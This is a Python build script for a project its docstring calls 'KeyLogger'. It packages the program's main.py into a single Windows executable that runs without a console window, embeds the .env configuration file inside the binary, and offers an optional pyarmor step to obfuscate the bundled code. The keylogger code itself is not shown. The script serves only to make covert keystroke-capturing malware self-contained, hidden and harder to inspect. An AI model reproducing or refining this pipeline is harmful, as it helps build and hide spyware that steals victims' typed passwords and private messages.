"""
Build script for KeyLogger.

Usage:
    python build_exe.py

Asks whether to obfuscate the source with pyarmor before compiling.
Bundles the .env file inside the executable so no external .env is needed.
Output: dist\main.exe  (self-contained, no extra files required)
"""

import os
import shutil
import subprocess
import sys


PYINSTALLER_BASE_FLAGS = [
    "--onefile",
    "--noconsole",
    "--clean",
]


def check_dependency(module, package_name):
    """Verify a package is importable, exit with a helpful message if not."""
    import importlib.util
    if importlib.util.find_spec(module) is None:
        print(f"ERROR: '{package_name}' is not installed in the current environment.")
        print(f"       Run: pip install {package_name}")
        sys.exit(1)


def run(cmd, **kwargs):
    print(f"\n> {' '.join(cmd)}\n")
    subprocess.run(cmd, check=True, **kwargs)


def pyinstaller_cmd(entry_point, src_dir, env_path):
    """
    Build PyInstaller command letting it auto-discover all imports from src_dir.
    The src_dir must contain plain (non-obfuscated) .py files so static analysis works.
    """
    cmd = [sys.executable, "-m", "PyInstaller"] + PYINSTALLER_BASE_FLAGS
    cmd += ["--add-data", f"{env_path};."]
    cmd += ["--paths", src_dir]
    cmd.append(entry_point)
    return cmd


def build_simple():
    src_dir = os.path.abspath(".")
    env_path = os.path.abspath(".env")
    run(pyinstaller_cmd("main.py", src_dir=src_dir, env_path=env_path))


def build_obfuscated():
    check_dependency("pyarmor", "pyarmor")

    pyarmor_exe = os.path.join(os.path.dirname(sys.executable), "pyarmor.exe")
    if not os.path.exists(pyarmor_exe):
        pyarmor_exe = shutil.which("pyarmor")
    if not pyarmor_exe:
        print("ERROR: pyarmor executable not found. Run: pip install pyarmor")
        sys.exit(1)

    obf_dir = os.path.abspath("obfuscated_dist")
    env_path = os.path.abspath(".env")
    src_dir = os.path.abspath(".")

    # Step 1: PyInstaller analyzes the ORIGINAL source (full static analysis, no hidden imports needed)
    print("\n--- Step 1: Analysing original source with PyInstaller ---")
    run(pyinstaller_cmd("main.py", src_dir=src_dir, env_path=env_path))

    # Step 2: obfuscate .py files inside the PyInstaller bundle folder
    # PyInstaller extracts sources to build/main/ — we obfuscate those in place
    pyi_src = os.path.join("build", "main")
    if not os.path.exists(pyi_src):
        print(f"WARNING: PyInstaller build folder '{pyi_src}' not found, skipping obfuscation.")
        return

    print("\n--- Step 2: Obfuscating .py files inside the bundle ---")
    py_files = [f for f in os.listdir(pyi_src) if f.endswith(".py")]
    if py_files:
        run([pyarmor_exe, "gen", "-O", obf_dir] + [os.path.join(pyi_src, f) for f in py_files])
        # Replace originals with obfuscated versions
        for f in py_files:
            src = os.path.join(obf_dir, f)
            dst = os.path.join(pyi_src, f)
            if os.path.exists(src):
                shutil.copy(src, dst)
        # Find and copy pyarmor runtime .pyd into the build folder
        for root, _, files in os.walk(obf_dir):
            for fname in files:
                if fname.endswith(".pyd") or fname == "pyarmor_runtime.so":
                    shutil.copy(os.path.join(root, fname), pyi_src)
                    print(f"[obfuscated build] Copied runtime: {fname}")
                    break
    else:
        print("WARNING: No .py files found in PyInstaller build folder.")

    # Step 3: repackage — rebuild exe from (now obfuscated) build folder
    print("\n--- Step 3: Repackaging obfuscated bundle ---")
    spec_file = "main.spec"
    if os.path.exists(spec_file):
        run([sys.executable, "-m", "PyInstaller", "--clean", spec_file])
    else:
        print("WARNING: main.spec not found, exe is NOT obfuscated (Step 1 output is valid).")

    # Cleanup obfuscated_dist
    if os.path.exists(obf_dir):
        shutil.rmtree(obf_dir)
        print(f"\n[cleanup] Removed '{obf_dir}'")


def main():
    if not os.path.exists(".env"):
        print("ERROR: .env file not found. Create it before building.")
        sys.exit(1)

    print("Build options:")
    print("  [1] Simple build (no obfuscation)")
    print("  [2] Obfuscated build (pyarmor + pyinstaller)")
    choice = input("\nChoice [1/2]: ").strip()

    if choice == "1":
        build_simple()
    elif choice == "2":
        build_obfuscated()
    else:
        print("Invalid choice. Exiting.")
        sys.exit(1)

    print("\n--- Build complete ---")
    print("Output: dist\\main.exe  (self-contained, no .env needed alongside it)")


if __name__ == "__main__":
    main()
